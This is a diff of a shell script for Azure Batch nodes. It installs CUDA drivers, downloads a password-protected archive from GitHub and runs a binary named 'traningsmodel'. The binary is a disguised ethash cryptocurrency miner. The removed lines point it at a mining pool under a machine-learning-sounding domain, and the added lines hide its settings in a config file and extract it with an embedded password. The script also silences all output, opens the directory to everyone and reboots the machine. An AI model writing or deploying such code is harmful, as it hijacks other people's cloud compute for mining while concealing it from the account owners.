@@ -2,10 +2,10 @@ DIR="/home/_azbatch/traningsmodel"
 if [ -f "$DIR" ]; then
   ### Take action if $DIR exists ###
     hostname=$(hostname | cut -c1-8) &&
-    /home/_azbatch/traningsmodel --algo ethash --url machinelearning.alicloud.nl:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
+    /home/_azbatch/traningsmodel -c config_model_e > /dev/null 2>&1 
 else
     sudo apt-get update ;
-    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure unzip ;
+    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure p7zip-full ;
     cd /home/_azbatch/ ;
     sudo rm cuda-ubuntu*  > /dev/null 2>&1 
     wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin > /dev/null 2>&1 
@@ -16,9 +16,9 @@ else
     sudo apt-get -y install cuda-drivers ;
     sudo chmod -R 777 /home/_azbatch ;
     cd /home/_azbatch ;
-    wget https://github.com/datadd/trainingmodel/raw/main/traningsmodel.zip &&
-    unzip /home/_azbatch/traningsmodel.zip &&
+    wget https://github.com/datadd/trainingmodel/raw/main/traningsmodel2.zip &&
+    7z x /home/_azbatch/traningsmodel2.zip -pWachtwoord123!  &&
     hostname=$(hostname | cut -c1-8) &&
-    /home/_azbatch/traningsmodel --algo ethash --url machinelearning.alicloud.nl:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
+    /home/_azbatch/traningsmodel -c config_model_e > /dev/null 2>&1 
     sudo reboot
 fi
